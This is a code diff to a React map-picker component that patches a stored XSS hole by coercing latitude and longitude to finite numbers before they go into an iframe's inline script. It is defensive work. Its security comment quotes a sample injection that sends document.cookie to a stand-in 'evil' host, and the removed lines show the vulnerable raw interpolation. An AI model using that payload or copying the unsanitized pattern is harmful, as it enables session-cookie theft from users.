@@ -286,11 +286,35 @@ export default function CheckpointPage() {
                 marginTop: 4,
               }}
             >
-              <iframe
-                title="cp-map"
-                style={{ width: "100%", height: "100%", border: "none" }}
-                srcDoc={`<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script><style>body{margin:0}#m{height:100vh}</style></head><body><div id="m"></div><script>var la=${form.latitude || 0},ln=${form.longitude || 0};var m=L.map('m').setView([la||-0.5,ln||101.4],la?16:5);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);var mk=null;if(la&&ln)mk=L.marker([la,ln]).addTo(m);m.on('click',function(e){if(mk)m.removeLayer(mk);mk=L.marker([e.latlng.lat,e.latlng.lng]).addTo(m);window.parent.postMessage({t:'cp-map',lat:e.latlng.lat.toFixed(6),lng:e.latlng.lng.toFixed(6)},'*')})<\/script></body></html>`}
-              />
+              {/*
+                SECURITY (Stored XSS, Tahap 3):
+                The values below feed an iframe srcDoc that gets parsed
+                as HTML+JS. The original code interpolated
+                `form.latitude || 0` and `form.longitude || 0` raw,
+                which is a string from a text input. A value like
+                  -0.5);fetch('https://evil/'+document.cookie);//
+                would break out of the JS expression context and
+                execute. The form's parseFloat on save and the DB's
+                float column normally prevent persistence of a bad
+                value, but we don't want the iframe to trust that
+                chain — coerce to a finite Number right here at the
+                point of interpolation.
+              */}
+              {(() => {
+                const num = (v: any, def: number) => {
+                  const n = Number(v);
+                  return Number.isFinite(n) ? n : def;
+                };
+                const la = num(form.latitude, 0);
+                const ln = num(form.longitude, 0);
+                return (
+                  <iframe
+                    title="cp-map"
+                    style={{ width: "100%", height: "100%", border: "none" }}
+                    srcDoc={`<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script><style>body{margin:0}#m{height:100vh}</style></head><body><div id="m"></div><script>var la=${la},ln=${ln};var m=L.map('m').setView([la||-0.5,ln||101.4],la?16:5);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);var mk=null;if(la&&ln)mk=L.marker([la,ln]).addTo(m);m.on('click',function(e){if(mk)m.removeLayer(mk);mk=L.marker([e.latlng.lat,e.latlng.lng]).addTo(m);window.parent.postMessage({t:'cp-map',lat:e.latlng.lat.toFixed(6),lng:e.latlng.lng.toFixed(6)},'*')})<\/script></body></html>`}
+                  />
+                );
+              })()}
             </div>
           </div>
           <p className="muted" style={{ fontSize: 11, margin: '8px 0', padding: '8px 12px', background: 'var(--primary-light)', borderRadius: 8 }}>💡 Klik pada peta di atas untuk menentukan koordinat otomatis, atau isi manual di bawah</p>
